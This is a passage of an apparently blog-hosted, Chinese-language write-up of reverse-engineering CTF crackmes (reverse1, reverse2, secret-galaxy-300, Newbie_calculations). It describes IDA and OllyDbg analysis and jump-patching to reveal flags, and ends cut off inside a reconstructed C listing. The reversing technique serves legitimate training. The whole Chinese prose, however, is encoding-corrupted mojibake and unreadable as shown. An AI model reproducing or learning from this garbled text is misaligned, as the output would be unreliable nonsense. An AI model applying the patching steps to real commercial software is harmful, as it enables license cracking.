&lt;= <span class="number">122</span>)</span><br><span class="line">a[i+<span class="number">1</span>] -= <span class="number">87</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(a[i+<span class="number">1</span>] &gt;= <span class="number">65</span> &amp;&amp; a[i+<span class="number">1</span>] &lt;=  <span class="number">90</span>) </span><br><span class="line">a[i+<span class="number">1</span>] -= <span class="number">55</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">a[i+<span class="number">1</span>] -= <span class="number">48</span>;</span><br><span class="line"></span><br><span class="line">sum = sum*<span class="number">16</span> + a[i+<span class="number">1</span>]; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(sum &gt; <span class="number">127</span>)</span><br><span class="line">sum -= <span class="number">128</span>;</span><br><span class="line"></span><br><span class="line">b[j++] = sum, sum = <span class="number">0</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(b);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="reverse1"><a href="#reverse1" class="headerlink" title="reverse1:"></a>reverse1:</h2><p>é¦–å…ˆæ‹¿åˆ°é¢˜, è¿˜æ˜¯æ‹–è¿›<strong>Exeinfope</strong>æŸ¥çœ‹ä¸€ä¸‹æ˜¯å¦æœ‰å£³:</p><p><img src="/2020/04/09/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200409121215784-1590549058520-1591952582454.png" alt="image-20200409121215784-1590549058520"></p><p>å—¯æ²¡æœ‰.</p><p>æ‹–è¿›ida, æ‰¾åˆ°ä¸»å‡½æ•°, æµè§ˆä¸€ä¸‹ç¨‹åºåŠŸèƒ½, ä¸€ä¸ªæ¸¸æˆ, å¥½åƒæ˜¯é€šè¿‡ç‚¹äº®æ‰€æœ‰ç¯è·å¾—flag. é‚£ä¹ˆå¿…å®šæœ‰ä¸€ä¸ªåˆ¤æ–­æ¡ä»¶, å¾€ä¸‹çœ‹ä¸»å‡½æ•°, æ˜¾è€Œæ˜“è§:</p><p><img src="/2020/04/09/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200409121557118-1590549064830-1591952588146.png" alt="image-20200409121557118-1590549064830"></p><p>é‚£ä¹ˆä¸‹é¢ä¸€ä¸ªå‡½æ•°å°±æ˜¯å…³é”®å‡½æ•°äº†, è¿›å»å‘ç°å°±æ˜¯å°†flagè®¡ç®—å‡ºæ¥, 56ä½é•¿åº¦, è¿˜æ˜¯æ‡’å¾—è‡ªå·±å†™ç¨‹åºæ¥ç®—.</p><p>æˆ‘ä»¬å¯ä»¥åœ¨idaä¸­æ‰¾åˆ° <strong>åˆ¤æ–­æ¡ä»¶</strong>é‚£é‡Œçš„çš„åœ°å€,: 0045F5D1</p><p><img src="/2020/04/09/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200409122019635-1590549068676-1591952593224.png" alt="image-20200409122019635-1590549068676"></p><p>å†é€šè¿‡OD,çœ‹åŠ è½½çš„ VA(è™šæ‹Ÿå†…å­˜åœ°å€) :</p><p><img src="/2020/04/09/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200409203440087-1590549086887-1591952596805.png" alt="image-20200409203440087-1590549086887"></p><p>é‚£ä¹ˆç”±äº åŠ¨æ€å’Œé™æ€çš„VAå¯èƒ½ä¸åŒï¼Œä½†æ˜¯å®ƒä»¬çš„RVAè¿˜æ˜¯ä¸€æ ·çš„ã€‚æˆ‘ä»¬ä½¿ç”¨åœ¨idaä¸­çš„æ‰¾åˆ°VA - imagebase = RVA. å†åŠ ä¸ŠODä¸­çš„VA, å³å¾—åˆ°åœ¨ODä¸­çš„åœ°å€: 0091F5D1. è¿™æ ·æˆ‘ä»¬ç›´æ¥åœ¨ODä¸­æ‰¾åˆ°è¿™ä¸ªåœ°å€: å¦‚ä¸‹å›¾, çœ‹åˆ°å¾ˆå¤š jnz. æ‰€ä»¥æˆ‘ä»¬çš„ç›®çš„æ˜¯è®©å®ƒéƒ½ä¸è·³è½¬, å¯ä»¥æ¯ä¸ªåœ°æ–¹éƒ½ nopäº†, ä½†æˆ‘ä»¬å¯ä»¥å¾€ä¸‹çœ‹, ç›´æ¥æ‰¾åˆ°å®ƒæœ€ååº”è¯¥å»åˆ°çš„å‡½æ•°åœ°å€(è®°ä¸ºA), é€šè¿‡æ‰“è¡¥ä¸æŠŠjnz xxxx, (å›¾ä¸­0091F5D8) æ”¹ä¸º jmp A.</p><p><img src="/2020/04/09/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200409204018803-1590549093480-1591952609729.png" alt="image-20200409204018803-1590549093480"></p><p>æœ€åä¸€æŒ‰ F9  è¿è¡Œ, å‡ºç°  flag  .</p><p><img src="/2020/04/09/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200409204652301-1590549096561-1591952613467.png" alt="image-20200409204652301-1590549096561"></p><hr><h2 id="reverse2"><a href="#reverse2" class="headerlink" title="reverse2:"></a>reverse2:</h2><p>æ‹¿åˆ°é¢˜æ˜¯Cæºç , ç›´æ¥åˆ†æå°±å¥½äº†, æ‰¾åˆ°ä¸»å‡½æ•°çœ‹ä¸€ä¸‹. æ˜ç¡®ç›®æ ‡, è¾“å…¥å­—ç¬¦ä¸², ä¹Ÿå°±æ˜¯flag, è¿›è¡Œä¸€ç³»åˆ—æ“ä½œå’ŒæŒ‡å®šå­—ç¬¦ä¸²æ¯”è¾ƒ. æ‰¾åˆ°æ¯”è¾ƒçš„åœ°æ–¹å¾ˆå®¹æ˜“æ¨å‡º:è¿™é‡Œresult  == 0;</p><p><img src="/2020/04/09/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200415170640341-1590549110220-1591952617886.png" alt="image-20200415170640341-1590549110220"></p><p>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥çŸ¥é“ä¸‹é¢å‡½æ•°çš„å¼‚æˆ–è¿ç®—ç»“æœä¸º0, é‚£ä¹ˆå³å‘ç”Ÿå¼‚æˆ–è¿ç®—çš„2ä¸ªæ•°ç›¸ç­‰.</p><p><img src="/2020/04/09/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200415170736593-1590549112522-1591952621317.png" alt="image-20200415170736593-1590549112522"></p><p>æœ€åå°±æ˜¯éšæœºæ•°çš„é€‰å–äº†, æˆ‘ä»¬çŸ¥é“å®ƒæ˜¯ &lt;= 64çš„, é‚£ä¹ˆå†™ä¸€ä¸ªCç¨‹åº, æŠŠæ‰€æœ‰ç»“æœæ‰“å°å‡ºæ¥, æ‰¾åˆ°ç¬¦åˆçš„å³å¯.</p><p><img src="/2020/04/09/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200415171038960-1590549115097-1591952634770.png" alt="image-20200415171038960-1590549115097"></p><p>æœ€åä»è¿™é“é¢˜, çŸ¥é“äº†, 1.<code>pthread_t</code>æ˜¯<code>unsigned long</code>å®å®šä¹‰çš„, 8ä¸ªå­—èŠ‚æ•´å‹æ•°æ®.2.<code>rand()%m</code>ä¹Ÿæ˜¯<code>random(m)</code>å®å®šä¹‰çš„.  </p><hr><h2 id="secret-galaxy-300"><a href="#secret-galaxy-300" class="headerlink" title="secret-galaxy-300"></a>secret-galaxy-300</h2><p>é¦–å…ˆé¢˜ä¸‹è½½ä¸‹æ¥, å‘ç°å‡†å¤‡äº†3ä¸ªä¸åŒçš„ç‰ˆæœ¬, å°±åˆ†æå¸¸è§çš„PEæ–‡ä»¶.  æƒ³å…ˆæ‰“å¼€.exeæ–‡ä»¶, ä½†æ˜¯é—ªä¸€ä¸‹å°±é€€å‡ºäº†, æ ¹æœ¬çœ‹ä¸åˆ°ç¨‹åºæ˜¯åšä»€ä¹ˆçš„.</p><p>é¦–å…ˆæŸ¥å£³, å‘ç°æ— å£³.ğŸ˜ å…ˆç”¨idaæ‰“å¼€, æ‰¾åˆ°mainå‡½æ•°.å‘ç°æ˜¯ä»å·²ç»ç¼–ç çš„å­—ç¬¦ä¸²å–å‡ºæ¥, åœ¨æ‰“å°åœ¨å±å¹•ä¸Š. è½½å…¥OD, ä¸‹æ–­ç‚¹, çœ‹åˆ°åº•æ‰“å°äº†ä»€ä¹ˆ:  åˆ—å‡ºå‡ ä¸ªé“¶æ²³; æ˜¯å¦æ˜¯æœ‰ç”Ÿç‰©å­˜åœ¨; å®ƒä»¬è·ç¦»åœ°çƒçš„è·ç¦». ä½†è¿™ä¸ªå’Œflagæœ‰ä»€ä¹ˆå…³ç³»å‘¢.ğŸ˜¢. æƒ³ä¸åˆ°è”ç³», å›åˆ°idaä¸­å†çœ‹çœ‹. </p><p><img src="/2020/04/09/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200415192448626-1590549120154-1591952639860.png" alt="image-20200415192448626-1590549120154"></p><p>å‘ç°å·²ç»ç¼–ç çš„å­—ç¬¦æœ‰ä¸€ä¸ªæ²¡è¢«æ‰“å°å‡ºæ¥. å°± ctrl + x, çœ‹å“ªé‡Œè°ƒç”¨äº†å®ƒ, è·Ÿè¿›å».</p><p><img src="/2020/04/09/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200415193002493-1590549136439-1591952646896.png" alt="image-20200415193002493-1590549136439"></p><p>å‘ç°éƒ½æ˜¯èµ‹å€¼æ“ä½œ, ä¸”æœ€åä¸€ä¸ªèµ‹å€¼0, å¾ˆå¯èƒ½æ˜¯ flag çš„å­—ç¬¦ä¸².è®°å½•å¼€å§‹å’Œç»“æŸçš„åœ°å€, å» OD ä¸­åŠ¨æ€è°ƒè¯•.</p><p><img src="/2020/04/09/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200415193726368-1590549141490-1591952651993.png" alt="image-20200415193726368-1590549141490"></p><p>ODä¸­åœ¨2ä¸ªåœ°å€, ä¸‹æ–­ç‚¹, å¹¶åœ¨å¼€å§‹è®°å½•ä¸‹èµ‹å€¼å­˜æ”¾æ•°æ®çš„åœ°å€, æŠŠå®ƒåœ¨æ•°æ®çª—å£ä¸­è·Ÿéš. F9æ‰§è¡Œå‡ºç°å­—ç¬¦ä¸².</p><p><img src="/2020/04/09/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200415194242898-1590549138934-1591952658378.png" alt="image-20200415194242898-1590549138934"></p><p>å¿ƒå¾—: æ³¨æ„æ–‡ä»¶ä¸­ç¼–ç äº†ä½†æ˜¯æ²¡æœ‰ä½¿ç”¨çš„å­—ç¬¦ä¸². </p><hr><h2 id="Newbie-calculations"><a href="#Newbie-calculations" class="headerlink" title="Newbie_calculations:"></a>Newbie_calculations:</h2><p>é¦–å…ˆä»é¢˜ç›®çœ‹å‡º, æ˜¯æ–°æ‰‹è®¡ç®—, æƒ³åˆ°åº”è¯¥å’Œè®¡ç®—æœ‰å…³çš„. </p><p>é¢˜ç›®ä¸‹è½½ä¸‹æ¥, æ‰“å¼€å, åªæ˜¯æ‰“å°  <strong>Your flag is:</strong> ,å°±å¡ä½äº†, ä¹Ÿæ²¡æœ‰è®©è¾“å…¥ä¿¡æ¯. åœ¨è‡ªå·±å†™Cç¨‹åºä¹Ÿé‡åˆ°è¿‡è¿™ç§é—®é¢˜, åº”è¯¥æ˜¯ç¨‹åºæœ‰ä»€ä¹ˆæ­»å¾ªç¯, æˆ–è€…å¤§é‡è€—æ—¶é—´çš„ç®—æ³•.</p><p>è½½å…¥ida, æ‰¾åˆ°mainå‡½æ•°, æœç„¶æœ‰å¾ˆå¤šå‡½æ•°, è·Ÿè¿›å…¶ä¸­ä¸€ä¸ªåå‘ç° v4 = -1, åé¢åˆç”¨æ¥å¾ªç¯, å› ä¸ºè‡ªå·±è¡¥ç ä¸æ˜¯å¾ˆæ¸…æ¥š, å¼€å§‹åªæ˜¯æƒ³åˆ°è¿™ä¸æ˜¯æ­»å¾ªç¯å˜›, ä¸”å’Œè‡ªå·±ä¹‹å‰çš„æƒ³çš„ä¸€æ ·. ç„¶åå¤©çœŸçš„è®¤ä¸º, å®ƒå¯èƒ½æ²¡ç”¨, è·³è¿‡å®ƒ, ç›´æ¥æ‰§è¡Œåé¢çš„æˆ–è®¸å¯ä»¥æ‰¾åˆ°ç­”æ¡ˆ, å°±çœŸçš„å»OD, æ‰“è¡¥ä¸, ç¨‹åºç›´æ¥å¥”æºƒ. </p><p><img src="/2020/04/09/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200417124955377-1590549145811-1591952671849.png" alt="image-20200417124955377-1590549145811"></p><p> è¿™ä¸ªæ—¶å€™å‘ç°æœ‰å¾ˆå¤šå‡½æ•°, éƒ½æ˜¯ä¸€æ ·çš„, å¥½åƒåªæœ‰3ä¸ªå‡½æ•°åœ¨å“ªé‡Œè°ƒç”¨. ä½†æƒ³åˆ°éº»çƒ¦,å‘ç°è®¡ç®—å’Œè¡¥ç ç›¸å…³, ç„¶åè‡ªå·±å†™ç®€å•çš„ç¨‹åºç¨‹åºå¤ä¹ äº†ä¸‹è¡¥ç ,  <strong>-1-128 = 127, 127+1 = -128;</strong>, å†ç»“åˆä¹‹å‰çœ‹åˆ°çš„è¡¥ç å’Œæ—¶é’ŸåŸç†å¾ˆåƒ, è‡ªå·±æ€»ç»“äº†ä¸‹, å¯ä»¥æŠŠè¿™ä¸ªè®¡ç®—æƒ³æˆæ˜¯ä¸€ä¸ªåœ†åœˆ, ä»¥ä¸€ä¸ªå­—èŠ‚8ä½æ¥çœ‹, æˆ‘ä»¬çŸ¥é“èŒƒå›´æ˜¯  <strong>-128 - 127</strong> </p><p><img src="/2020/04/09/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200417131746746-1590549170275-1591952678402.png" alt="image-20200417131746746-1590549170275"></p><p>çŸ¥é“ä¸€ä¸ªå‘¨æœŸçš„å¤§å°æ˜¯ <strong>256</strong>.  é‚£ä¹ˆæœ‰ <strong>-1+1= 0</strong> ä¹Ÿå¯ä»¥å†™æˆ <strong>-1 - 255 = 0</strong>, ç›¸å½“äº -1 é€†æ—¶é’ˆè½¬äº† ä¸€åœˆå°‘1çš„è·ç¦», é‚£ä¹ˆå°±æ˜¯0çš„ä½ç½®, å› ä¸ºå¦‚æœè½¬äº†ä¸€åœˆçš„è¯, å›åˆ°åŸä½ç½®,. é¡ºæ—¶é’ˆåŠ æ³•ä¹Ÿæ˜¯ä¸€æ ·çš„åŸç†, <strong>0 + 256 = 0</strong>;</p><p>çŸ¥é“äº†è¿™ä¸€ç‚¹, é‚£ä¹ˆè¿™é“é¢˜å°±å¾ˆå®¹æ˜“äº†.è¦ä½¿ v4 == 0, é‚£ä¹ˆç›¸å½“äº v4é€†æ—¶é’ˆæ—‹è½¬ä¸€åœˆå°‘a2çš„è·ç¦», ç›¸å½“äº v4 += a2,</p><p>é‚£ä¹ˆåŒæ ·çš„é“ç†, â€“*a ç»è¿‡å¾ªç¯å, ç›¸å½“äºé€†æ—¶é’ˆæ—‹è½¬ä¸€åœˆå°‘a2çš„è·ç¦», å°±æ˜¯ *a1 += a2; è¡¥ç çœŸçš„ç¥å¥‡.ğŸ˜</p><p><img src="/2020/04/09/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200417133116275-1590549174848-1591952682724.png" alt="image-20200417133116275-1590549174848"></p><p>åé¢çš„2ä¸ªå‡½æ•°åŒç†åˆ†æ.  å°†è¯¥ä¸‰ä¸ªå‡½æ•°åˆ†åˆ«æ”¹å†™æˆå¯¹åº”çš„ä¹˜, å‡, åŠ :</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> *<span class="title">sub_401100</span><span class="params">(<span class="keyword">int</span> *a, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">*a = (*a) * b;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>  a; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> *<span class="title">sub_401220</span><span class="params">(<span class="keyword">int</span> *a, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">*a = (*a) - b;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> *<span class="title">sub_401000</span><span class="params">(<span class="keyword">int</span> *a, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">*a = (*a) + b; </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> *v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v4;</span><br><span class="line">  <span class="keyword">int</span> *v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v6; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v8; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v9; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v10; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v11; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v12; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v13; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v14; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v15; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v16; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v17; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v18; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v19; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v20; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v21; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v22; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v23; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v24; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v25; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v26; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v27; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v28; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v29; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v30; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v31; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v32; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v33; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v34; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v35; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v36; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v37; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v38; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v39; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v40; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v41; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v42; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v43; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v44; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v45; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v46; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v47; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v48; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v49; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v50; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v51; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v52; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v53; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v54; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v55; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v56; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v57; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v58; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v59; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v60; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v61; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v62; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v63; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v64; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v65; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v66; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v67; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v68; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v69; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v70; <span class="comment">// 